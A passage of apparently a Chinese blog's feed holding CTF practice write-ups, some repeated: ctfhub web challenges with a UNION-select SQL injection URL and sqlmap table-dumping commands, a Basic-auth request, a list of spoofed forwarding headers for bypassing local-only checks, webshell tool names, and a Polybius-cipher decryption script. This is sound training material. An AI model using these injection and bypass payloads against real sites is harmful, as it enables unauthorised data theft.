href="https://writeup.ctfhub.com/Skill/Web/SQL%E6%B3%A8%E5%85%A5/jkJpSTk3mpi55uRMMk23TJ.html">整数型注入-writeup</a></p><h3 id="方法1：手工注入"><a href="#方法1：手工注入" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=-1 union select 1,group_concat(flag) from flag<br></code></pre></td></tr></table></figure><h3 id="方法2：sqlmap"><a href="#方法2：sqlmap" class="headerlink" title="方法2：sqlmap"></a>方法2：sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli --tables<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag --columns<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag -C flag --dump<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】ctfhub web类型</title>
    <link href="/2023/08/07/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20web%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/07/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20web%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="web-请求方式"><a href="#web-请求方式" class="headerlink" title="web 请求方式"></a>web 请求方式</h2><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/aFVx7vvx1bsSVoCk3zh68x.html">请求方式-writeup</a></p><p>重点内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl -X 指定请求方法</span><br>curl -X CTFHUB http://challenge-f9bba78a0639c4e4.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><h2 id="web-302跳转"><a href="#web-302跳转" class="headerlink" title="web 302跳转"></a>web 302跳转</h2><p>状态码301：永久跳转（永久重定向）。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替<br>状态码302：临时重定向</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/erBvC63BtiquPYT4C3MUzX.html">302跳转-writeup</a></p><p>重点内容：<br>1）可以用curl直接访问<br>2）用burpsuite来访问</p><h2 id="Web-Cookie"><a href="#Web-Cookie" class="headerlink" title="Web Cookie"></a>Web Cookie</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/6zSDRPLbitJ5j4e7CE9dLp.html">Cookie-witeup</a></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">基础认证-writeip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /flag.html HTTP/1.1<br>Host: challenge-879836353d25e7b6.sandbox.ctfhub.com:10800<br>Cache-Control: max-age=0<br>Authorization: Basic YWRtaW46MTIzNDU2            <span class="hljs-comment">### 重点</span><br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://challenge-879836353d25e7b6.sandbox.ctfhub.com:10800/<br>Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br>Connection: close<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230807193523.png" alt="image.png"></p><p>重点内容：取消Payload Encoding</p><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/SQL%E6%B3%A8%E5%85%A5/jkJpSTk3mpi55uRMMk23TJ.html">整数型注入-writeup</a></p><h3 id="方法1：手工注入"><a href="#方法1：手工注入" class="headerlink" title="方法1：手工注入"></a>方法1：手工注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=-1 union select 1,group_concat(flag) from flag<br></code></pre></td></tr></table></figure><h3 id="方法2：sqlmap"><a href="#方法2：sqlmap" class="headerlink" title="方法2：sqlmap"></a>方法2：sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli --tables<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag --columns<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag -C flag --dump<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022安全比赛个人赛解题思路</title>
    <link href="/2023/07/27/ctf/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/27/ctf/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="heade3"><a href="#heade3" class="headerlink" title="heade3"></a>heade3</h2><p>Burpsuite拦截 访问    发现了flag字段</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Jul 2023 06:03:34 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3042<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/8.0.15<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>flag&#123;9964ea2e-b321-4629-a613-780ff5441ee0&#125;<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br></code></pre></td></tr></table></figure><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>将题目中的压缩包解压后，看到提示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">棋盘:[[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>密文:13,43,42,22,33,35,21,54,21,21,21,21,21,21<br></code></pre></td></tr></table></figure><p>根据该格式，使用python脚本来获取输出为：明文： THISFLAGAAAAAA，使用flag包裹，即为flag{THISFLAGAAAAAA}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_polybius_square</span>(<span class="hljs-params">board</span>):<br>    <span class="hljs-comment"># 创建Polybius棋盘，使用给定的2元数组表示</span><br>    polybius_square = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board[i])):<br>            polybius_square[board[i][j]] = (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> polybius_square<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_polybius</span>(<span class="hljs-params">polybius_square, ciphertext</span>):<br>    <span class="hljs-comment"># 解密Polybius密文</span><br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    ciphertext = ciphertext.replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 去除逗号分隔</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), <span class="hljs-number">2</span>):<br>        row = <span class="hljs-built_in">int</span>(ciphertext[i])<br>        col = <span class="hljs-built_in">int</span>(ciphertext[i + <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> letter, position <span class="hljs-keyword">in</span> polybius_square.items():<br>            <span class="hljs-keyword">if</span> position == (row, col):<br>                plaintext += letter<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 给出Polybius棋盘，以2元数组表示</span><br>    chessboard = [[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>    <br>    <span class="hljs-comment"># 给出密文，每两个字符用逗号分隔</span><br>    ciphertext = <span class="hljs-string">&quot;13,43,42,22,33,35,21,54,21,21,21,21,21,21&quot;</span><br><br>    <span class="hljs-comment"># 创建Polybius棋盘</span><br>    polybius_square = create_polybius_square(chessboard)<br><br>    <span class="hljs-comment"># 解密并打印明文</span><br>    plaintext = decrypt_polybius(polybius_square, ciphertext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文：&quot;</span>, plaintext)<br></code></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>将题目中的内容进行base32解码，即可获得flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022安全比赛个人赛解题思路</title>
    <link href="/2023/07/27/ctf/unsupported/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/27/ctf/unsupported/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="heade3"><a href="#heade3" class="headerlink" title="heade3"></a>heade3</h2><p>Burpsuite拦截 访问    发现了flag字段</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Jul 2023 06:03:34 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3042<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/8.0.15<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>flag&#123;9964ea2e-b321-4629-a613-780ff5441ee0&#125;<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br></code></pre></td></tr></table></figure><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>将题目中的压缩包解压后，看到提示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">棋盘:[[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>密文:13,43,42,22,33,35,21,54,21,21,21,21,21,21<br></code></pre></td></tr></table></figure><p>根据该格式，使用python脚本来获取输出为：明文： THISFLAGAAAAAA，使用flag包裹，即为flag{THISFLAGAAAAAA}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_polybius_square</span>(<span class="hljs-params">board</span>):<br>    <span class="hljs-comment"># 创建Polybius棋盘，使用给定的2元数组表示</span><br>    polybius_square = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board[i])):<br>            polybius_square[board[i][j]] = (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> polybius_square<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_polybius</span>(<span class="hljs-params">polybius_square, ciphertext</span>):<br>    <span class="hljs-comment"># 解密Polybius密文</span><br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    ciphertext = ciphertext.replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 去除逗号分隔</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), <span class="hljs-number">2</span>):<br>        row = <span class="hljs-built_in">int</span>(ciphertext[i])<br>        col = <span class="hljs-built_in">int</span>(ciphertext[i + <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> letter, position <span class="hljs-keyword">in</span> polybius_square.items():<br>            <span class="hljs-keyword">if</span> position == (row, col):<br>                plaintext += letter<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 给出Polybius棋盘，以2元数组表示</span><br>    chessboard = [[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>    <br>    <span class="hljs-comment"># 给出密文，每两个字符用逗号分隔</span><br>    ciphertext = <span class="hljs-string">&quot;13,43,42,22,33,35,21,54,21,21,21,21,21,21&quot;</span><br><br>    <span class="hljs-comment"># 创建Polybius棋盘</span><br>    polybius_square = create_polybius_square(chessboard)<br><br>    <span class="hljs-comment"># 解密并打印明文</span><br>    plaintext = decrypt_polybius(polybius_square, ciphertext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文：&quot;</span>, plaintext)<br></code></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h2><p>将题目中的内容进行base32解码，即可获得flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】练习题</title>
    <link href="/2023/07/24/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <url>/2023/07/24/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p> <a href="http://www.bihuoedu.com/">网络安全CTF比赛模拟题</a></p><p>web：网络攻防<br>reverse：逆向工程<br>pwn：二进制<br>crypto：密码学<br>mobile：移动安全<br>misc：安全杂项</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h3><p>浏览器插件<br>右键 检查</p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>java编写的用于测试网络应用程序安全性的图形化工具</p><p>dvwa靶场</p><p>本地访问<br>X-Forwarded-For:127.0.0.1</p><p>中文乱码：<a href="https://blog.csdn.net/weixin_46329243/article/details/112950158">https://blog.csdn.net/weixin_46329243/article/details/112950158</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP: 127.0.0.1<br>Forwarded-For-Ip: 127.0.0.1<br>Forwarded-For: 127.0.0.1<br>Forwarded-For: localhost<br>Forwarded: 127.0.0.1<br>Forwarded: localhost<br>True-Client-IP: 127.0.0.1<br>X-Client-IP: 127.0.0.1<br>X-Custom-IP-Authorization: 127.0.0.1<br>X-Forward-For: 127.0.0.1<br>X-Forward: 127.0.0.1<br>X-Forward: localhost<br>X-Forwarded-By: 127.0.0.1<br>X-Forwarded-By: localhost<br>X-Forwarded-For-Original: 127.0.0.1<br>X-Forwarded-For-original: localhost<br>X-Forwarded-For: 127.0.0.1<br>X-Forwarded-For: localhost<br>X-Forwarded-Server: 127.0.0.1<br>X-Forwarded-Server: localhost<br>X-Forwarded: 127.0.0.1<br>X-Forwarded: localhost<br>X-Forwared-Host: 127.0.0.1<br>X-Forwared-Host: localhost<br>X-Host: 127.0.0.1<br>X-Host: localhost<br>X-HTTP-Host-Override: 127.0.0.1<br>X-Originating-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>X-Remote-Addr: 127.0.0.1<br>X-Remote-Addr: localhost<br>X-Remote-IP: 127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><p>一句话木马</p><p>蚁剑、冰蝎、哥斯拉<br>浏览器：about:config</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sql注入<br>用于探测目标是否存在sql注入</p><h2 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h2><p>双写绕过</p><p>view-source:<a href="http://a.y1ng.vip:1126/robots/robots.txt">http://a.y1ng.vip:1126/robots/robots.txt</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】练习题</title>
    <link href="/2023/07/24/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <url>/2023/07/24/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p> <a href="http://www.bihuoedu.com/">网络安全CTF比赛模拟题</a></p><p>web：网络攻防<br>reverse：逆向工程<br>pwn：二进制<br>crypto：密码学<br>mobile：移动安全<br>misc：安全杂项</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h3><p>浏览器插件<br>右键 检查</p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>java编写的用于测试网络应用程序安全性的图形化工具</p><p>dvwa靶场</p><p>本地访问<br>X-Forwarded-For:127.0.0.1</p><p>中文乱码：<a href="https://blog.csdn.net/weixin_46329243/article/details/112950158">https://blog.csdn.net/weixin_46329243/article/details/112950158</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 